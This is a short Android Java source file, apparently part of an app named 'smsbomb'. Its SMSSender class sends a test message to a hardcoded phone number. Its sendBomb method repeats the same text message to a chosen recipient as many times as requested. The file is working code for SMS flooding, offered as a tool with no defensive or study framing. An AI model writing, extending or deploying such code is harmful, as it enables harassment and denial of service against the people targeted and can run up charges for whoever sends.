package org.opticalbox.smsbomb;

import android.telephony.SmsManager;

public class SMSSender {
	public void sendDummySMS() {
		String number = "0617291592";
		SmsManager manager = SmsManager.getDefault();
		
		//PendingIntent sentPI;
		//String SENT = "SMS_SENT";

		//sentPI = PendingIntent.getBroadcast((Context) this, 0, new Intent(SENT), 0);
		
		manager.sendTextMessage(number, null, "Dummmy text message", null, null);
	}
	
	public void sendSMS(String destination, String message) {
		SmsManager.getDefault().sendTextMessage(destination, null, message, null, null);
	}
	
	public void sendBomb(String destination, String message, String count) {
		Integer countInt = Integer.parseInt(count);
		for (int i = 0; i < countInt; i++) {
			sendSMS(destination, message);
		}
	}

}
